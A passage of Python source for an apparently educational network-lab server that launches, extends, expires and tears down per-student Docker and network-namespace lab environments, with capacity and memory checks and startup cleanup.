        await asyncio.sleep(random.uniform(2, 10))
        while True:
            try:
                await self._site_up()
            except asyncio.CancelledError:
                raise
            except Exception:
                pass
            await asyncio.sleep(30)

    # --------------------------------------------------------- teardown
    async def stop_services(self):
        for t in self.tasks:
            t.cancel()
        self.tasks = []
        for srv in self.servers:
            srv.close()
            if hasattr(srv, 'close_clients'):
                srv.close_clients()
        self.servers = []
        if self.dnsmasq is not None and self.dnsmasq.returncode is None:
            self.dnsmasq.kill()
            try:
                await asyncio.wait_for(self.dnsmasq.wait(), 5)
            except asyncio.TimeoutError:
                pass
        self.dnsmasq = None

    async def teardown(self):
        await self.stop_services()
        await run('pkill', '-f', 'conf-file=%s' % os.path.join(self.env_dir, 'dnsmasq.conf'), check=False)
        await run('docker', 'rm', '-f', self.container, check=False)
        for r in ROLES + ['ws']:
            if os.path.exists(self.ns_path(r)):
                await run('ip', 'netns', 'del', self.ns(r), check=False)


def mem_status():
    info = {}
    with open('/proc/meminfo') as f:
        for line in f:
            k, v = line.split(':', 1)
            info[k] = int(v.split()[0])
    return {'mem_avail_mb': info['MemAvailable'] // 1024, 'swap_free_mb': info.get('SwapFree', 0) // 1024,
            'mem_total_mb': info['MemTotal'] // 1024}


class Manager:
    def __init__(self, store, max_envs=30, lab_minutes=60.0, allow_extend=True, min_free_mb=160):
        self.store = store
        self.envs = {}
        self.busy = set()
        self.sem = asyncio.Semaphore(2)
        self.max_envs = max_envs
        # Every lab machine stops lab_minutes after launch, so abandoned labs free their resources.
        # A student who is still working can extend it during the last few minutes.
        self.lab_minutes = lab_minutes
        self.lab_seconds = lab_minutes * 60
        self.allow_extend = allow_extend
        self.extend_window = min(15 * 60, self.lab_seconds / 2)
        self.min_free_mb = min_free_mb
        self.setup_error = None

    async def preflight(self):
        """Check Docker and the workstation image once at startup and log plain fixes."""
        rc, out, err = await run('docker', 'version', '--format', '{{.Server.Version}}', check=False)
        if rc != 0:
            self.setup_error = 'The lab server cannot reach Docker. Ask your instructor.'
            log.error('cannot reach the Docker daemon (%s). Mount /var/run/docker.sock into this container '
                      '(see docker-compose.yml).', err.strip()[:200])
            return
        log.info('Docker engine %s reachable', out.strip())
        rc, _, _ = await run('docker', 'image', 'inspect', WS_IMAGE, check=False)
        if rc != 0:
            self.setup_error = 'The workstation image is missing on the lab server. Ask your instructor.'
            log.error('workstation image %s not found. Build it with: docker compose build', WS_IMAGE)
            return
        self.setup_error = None

    def capacity_error(self, sid):
        if self.setup_error:
            return self.setup_error
        if sid in self.envs:
            return None
        active = len(self.envs) + len([s for s in self.busy if s not in self.envs])
        if active >= self.max_envs:
            return 'The lab server is full (%d machines running). Ask your instructor.' % active
        m = mem_status()
        if m['mem_avail_mb'] + m['swap_free_mb'] // 2 < self.min_free_mb:
            return 'The lab server is low on memory right now. Ask your instructor.'
        return None

    def launch(self, sid, reset_router=True):
        if sid in self.busy:
            return
        self.busy.add(sid)
        self.store.set_env(sid, 'starting', 'Building your network...')
        asyncio.create_task(self._launch(sid))

    async def _launch(self, sid):
        env = None
        try:
            async with self.sem:
                old = self.envs.pop(sid, None)
                if old:
                    await old.teardown()
                self.store.set_env_started(sid, time.time())
                env = Env(self, self.store.student_by_sid(sid))
                await env.build()
                env.expires = time.time() + self.lab_seconds
                self.store.set_env_expires(sid, env.expires)
                self.envs[sid] = env
                self.store.set_env(sid, 'running', '')
                log.info('env %s running', sid)
        except Exception as e:
            log.exception('launch %s failed', sid)
            self.store.set_env(sid, 'error', 'Launch failed: %s' % str(e)[:200])
            if env:
                try:
                    await env.teardown()
                except Exception:
                    pass
        finally:
            self.busy.discard(sid)

    def stop(self, sid, msg=''):
        if sid in self.busy:
            return
        self.busy.add(sid)
        self.store.set_env(sid, 'stopping', 'Shutting down...')
        asyncio.create_task(self._stop(sid, msg))

    def extend(self, sid, by_instructor=False):
        """Give a running lab another lab_minutes. Students may do this only near the end."""
        env = self.envs.get(sid)
        if env is None or sid in self.busy:
            return None, 'Your lab is not running.'
        now = time.time()
        if by_instructor:
            env.expires = max(env.expires, now) + self.lab_seconds
        else:
            if not self.allow_extend:
                return None, 'Extending labs is turned off on this server.'
            if env.expires - now > self.extend_window:
                return None, 'You can extend in the last %d minutes.' % (self.extend_window // 60)
            env.expires = now + self.lab_seconds
        self.store.set_env_expires(sid, env.expires)
        return env.expires, None

    async def _stop(self, sid, msg=''):
        try:
            env = self.envs.pop(sid, None)
            if env is None:
                env = Env(self, self.store.student_by_sid(sid))
            await env.teardown()
        except Exception:
            log.exception('stop %s', sid)
        finally:
            self.store.set_env(sid, 'none', msg)
            self.busy.discard(sid)

    async def reconcile(self):
        """On startup: labs cannot survive a restart of this container, so clean up whatever is left."""
        for st in self.store.students():
            if st['env_state'] in ('running', 'starting', 'stopping'):
                env = Env(self, st)
                await env.teardown()
                self.store.set_env(st['sid'], 'none', 'Your machine was stopped by a server restart. Launch it again.')
        _, out, _ = await run('docker', 'ps', '-aq', '--filter', 'label=netlab.instance=%s' % INSTANCE, check=False)
        ids = out.split()
        if ids:
            log.info('removing %d leftover workstation container(s)', len(ids))
            await run('docker', 'rm', '-f', *ids, check=False, timeout=120)
        if os.path.isdir('/run/netns'):
            for nsname in os.listdir('/run/netns'):
                if nsname.startswith('nl') and '-' in nsname:
                    await run('ip', 'netns', 'del', nsname, check=False)

    async def shutdown(self):
        """Container is stopping: the namespaces die with it, so remove every lab machine now."""
        msg = 'Your machine was stopped because the lab server restarted. Launch it again.'
        envs = list(self.envs.values())
        self.envs.clear()
        for env in envs:
            try:
                await env.stop_services()
            except Exception:
                log.exception('stop services %s', env.sid)
            self.store.set_env(env.sid, 'none', msg)
        for sid in list(self.busy):
            self.store.set_env(sid, 'none', msg)
        _, out, _ = await run('docker', 'ps', '-aq', '--filter', 'label=netlab.instance=%s' % INSTANCE, check=False)
        ids = out.split()
        if ids:
            await run('docker', 'rm', '-f', *ids, check=False, timeout=120)
        log.info('removed %d workstation container(s)', len(ids))

    async def maintenance(self):
        while True:
            await asyncio.sleep(60)
            try:
                now = time.time()
                for sid, env in list(self.envs.items()):
                    if sid in self.busy:
                        continue
                    if now >= env.expires:
                        log.info('time is up for env %s, stopping it', sid)
                        self.stop(sid, 'Your lab stopped after its time ran out, to free resources for others. '
                                       'Your solved stages are kept. Click Launch lab to start a fresh one.')
                        continue
                    await env.watchdog()
            except Exception:
                log.exception('maintenance')
